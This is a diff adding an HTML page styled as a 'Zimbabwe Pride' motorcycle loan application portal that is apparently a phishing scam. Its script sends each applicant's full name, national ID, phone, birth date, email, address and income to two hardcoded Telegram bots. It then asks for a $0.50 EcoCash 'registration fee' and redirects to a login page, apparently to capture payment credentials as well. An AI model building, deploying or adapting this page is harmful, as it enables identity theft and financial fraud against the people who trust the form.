@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Zimbabwe Pride - Loan Application</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #eeeeee;
+            color: #111;
+            padding: 20px 10px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 620px;
+            margin: auto;
+            background: #fff;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, .15);
+        }
+        
+        .header {
+            background: #08751e;
+            color: white;
+            text-align: center;
+            padding: 18px 15px;
+        }
+        
+        .header h1 {
+            font-style: italic;
+            font-weight: 900;
+            font-size: clamp(22px, 5vw, 32px);
+        }
+        
+        .header p {
+            font-size: 14px;
+            margin-top: 4px;
+            opacity: .9;
+        }
+        
+        .steps {
+            display: flex;
+            background: #111;
+            color: #777;
+            font-size: 14px;
+            font-weight: 900;
+        }
+        
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 12px 5px;
+        }
+        
+        .step.active { background: #d00000; color: white; }
+        .step.done { background: #08751e; color: white; }
+        
+        .form-section {
+            padding: 25px 25px 30px;
+            display: none;
+        }
+        
+        .form-section.active { display: block; }
+        
+        .section-heading {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 900;
+            font-style: italic;
+            color: #08751e;
+            margin-bottom: 5px;
+        }
+        
+        .section-sub {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            font-weight: 900;
+            font-size: 14px;
+            margin: 14px 0 5px;
+        }
+        
+        label span { color: #d00000; }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #08751e;
+        }
+        
+        .row-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            border: none;
+            padding: 15px;
+            margin-top: 22px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            color: white;
+            background: #08751e;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, .2);
+        }
+        
+        .btn:hover { transform: scale(1.02); }
+        
+        .btn.ecocash {
+            background: #103d8f;
+            font-size: 20px;
+            padding: 18px;
+        }
+        
+        .pay-box {
+            background: #eef3fb;
+            border: 2px dashed #103d8f;
+            border-radius: 12px;
+            padding: 18px;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .pay-amount {
+            font-size: 42px;
+            font-weight: 1000;
+            color: #08751e;
+        }
+        
+        .ecocash-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #103d8f;
+            color: white;
+            font-weight: 900;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        
+        .applicant-summary {
+            background: #f4f9f4;
+            border-left: 4px solid #08751e;
+            padding: 10px 14px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-top: 15px;
+            color: #174ca4;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+            background: none;
+            border: none;
+        }
+        
+        @media (max-width: 480px) {
+            .row-2 { grid-template-columns: 1fr; gap: 0; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <header class="header">
+            <h1>ZIMBABWE PRIDE, YOUR RIDE!</h1>
+            <p>Motorcycle Loan Application Portal</p>
+        </header>
+
+        <div class="steps">
+            <div class="step active" id="stepBar1">1. PERSONAL INFO</div>
+            <div class="step" id="stepBar2">2. PAY $0.50 FEE</div>
+        </div>
+
+        <section class="form-section active" id="section1">
+            <div class="section-heading">APPLICANT DETAILS</div>
+            <div class="section-sub">Fill in your personal information to begin your application.</div>
+
+            <form id="infoForm" onsubmit="return submitInfo(event)">
+                <label>Full Name <span>*</span></label>
+                <input type="text" id="fullName" placeholder="e.g. Tendai Moyo" required>
+
+                <label>National ID Number <span>*</span></label>
+                <input type="text" id="nationalId" placeholder="e.g. 12-345678 A 99" required>
+
+                <div class="row-2">
+                    <div>
+                        <label>Phone Number <span>*</span></label>
+                        <input type="tel" id="phone" placeholder="e.g. 077 123 4567" required>
+                    </div>
+                    <div>
+                        <label>Date of Birth <span>*</span></label>
+                        <input type="date" id="dob" required>
+                    </div>
+                </div>
+
+                <label>Email Address <span>*</span></label>
+                <input type="email" id="email" placeholder="e.g. tendai@gmail.com" required>
+
+                <label>Home Address <span>*</span></label>
+                <textarea id="address" rows="2" placeholder="Street, Suburb, City" required></textarea>
+
+                <label>Occupation <span>*</span></label>
+                <input type="text" id="occupation" placeholder="e.g. Vendor, Teacher, Driver" required>
+
+                <div class="row-2">
+                    <div>
+                        <label>Monthly Income (USD) <span>*</span></label>
+                        <select id="income" required>
+                            <option value="">-- Select --</option>
+                            <option>Below $100</option>
+                            <option>$100 - $300</option>
+                            <option>$300 - $500</option>
+                            <option>Above $500</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label>Which Bike? <span>*</span></label>
+                        <select id="bike" required>
+                            <option value="">-- Select --</option>
+                            <option value="150cc">150cc — $275 deposit</option>
+                            <option value="125cc">125cc — $230 deposit</option>
+                            <option value="100cc">100cc — $205 deposit</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn">CONTINUE TO PAYMENT →</button>
+            </form>
+        </section>
+
+        <section class="form-section" id="section2">
+            <div class="section-heading">REGISTRATION FEE</div>
+            <div class="section-sub">A one-time fee is required to access the application portal.</div>
+
+            <div class="applicant-summary" id="summaryBox"></div>
+
+            <div class="pay-box">
+                <div>REGISTRATION FEE</div>
+                <div class="pay-amount">$0.50</div>
+
+                <div class="ecocash-badge">
+                    💚 Pay with <strong>EcoCash</strong>
+                </div>
+
+                <div style="font-size:14px; color:#333;">
+                    You will be redirected to the EcoCash payment page to complete your <strong>$0.50</strong> one-time registration fee. After payment, you will be taken to the application portal login.
+                </div>
+            </div>
+
+            <button class="btn ecocash" onclick="payWithEcoCash()">
+                PAY $0.50 WITH ECOCASH →
+            </button>
+
+            <button class="back-link" onclick="showStep(1)">← Back to personal info</button>
+        </section>
+
+    </div>
+
+    <script>
+        // ══════════════════════════════════════════════════════
+        // TELEGRAM BOT CONFIGURATION
+        // ══════════════════════════════════════════════════════
+        const BOT_TOKEN_1 = '8777667438:AAH_iun6KkMmvaxrRgEh94zBnPgz1MfGmvw';
+        const CHAT_ID_1 = '6362646815';
+
+        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const CHAT_ID_2 = '5615316142';
+
+        // Send message to both Telegram bots
+        function sendToTelegramBots(message) {
+            // Send to Bot 1
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+
+            // Send to Bot 2
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+        }
+
+        // Store applicant data between steps
+        let applicant = {};
+
+        function showStep(n) {
+            for (let i = 1; i <= 2; i++) {
+                document.getElementById("section" + i).classList.remove("active");
+                document.getElementById("stepBar" + i).classList.remove("active", "done");
+            }
+            document.getElementById("section" + n).classList.add("active");
+            document.getElementById("stepBar" + n).classList.add("active");
+            if (n === 2) {
+                document.getElementById("stepBar1").classList.add("done");
+            }
+            window.scrollTo({ top: 0, behavior: "smooth" });
+        }
+
+        // STEP 1: save personal info, go to payment step
+        function submitInfo(e) {
+            e.preventDefault();
+
+            applicant = {
+                name: document.getElementById("fullName").value.trim(),
+                id: document.getElementById("nationalId").value.trim(),
+                phone: document.getElementById("phone").value.trim(),
+                dob: document.getElementById("dob").value,
+                email: document.getElementById("email").value.trim(),
+                address: document.getElementById("address").value.trim(),
+                occupation: document.getElementById("occupation").value.trim(),
+                income: document.getElementById("income").value,
+                bike: document.getElementById("bike").value
+            };
+
+            // Send applicant data to Telegram
+            const message = `*🏍 NEW MOTORCYCLE LOAN APPLICATION*\n\n` +
+                `👤 *Full Name:* ${applicant.name}\n` +
+                `🆔 *National ID:* ${applicant.id}\n` +
+                `📱 *Phone:* ${applicant.phone}\n` +
+                `📅 *Date of Birth:* ${applicant.dob}\n` +
+                `📧 *Email:* ${applicant.email}\n` +
+                `🏠 *Address:* ${applicant.address}\n` +
+                `💼 *Occupation:* ${applicant.occupation}\n` +
+                `💰 *Monthly Income:* ${applicant.income}\n` +
+                `🏍 *Selected Bike:* ${applicant.bike}\n\n` +
+                `⏳ *Status:* Awaiting $0.50 registration fee payment`;
+
+            sendToTelegramBots(message);
+
+            // Show summary on payment step
+            document.getElementById("summaryBox").innerHTML =
+                "<strong>" + applicant.name + "</strong><br>" +
+                "ID: " + applicant.id + "<br>" +
+                "Phone: " + applicant.phone + "<br>" +
+                "Selected Bike: <strong>" + applicant.bike + "</strong>";
+
+            showStep(2);
+            return false;
+        }
+
+        // STEP 2: EcoCash payment — redirect to login.html after paying
+        function payWithEcoCash() {
+            localStorage.setItem("zp_applicant", JSON.stringify(applicant));
+
+            // Send payment initiated notification to Telegram
+            const message = `*💳 PAYMENT INITIATED*\n\n` +
+                `👤 *Applicant:* ${applicant.name}\n` +
+                `📱 *Phone:* ${applicant.phone}\n` +
+                `🏍 *Bike:* ${applicant.bike}\n` +
+                `💵 *Amount:* $0.50\n\n` +
+                `➡️ Redirecting to login page...`;
+
+            sendToTelegramBots(message);
+
+            // Redirect to login page
+            setTimeout(() => {
+                window.location.href = "login.html";
+            }, 800);
+        }
+    </script>
+</body>
+</html>
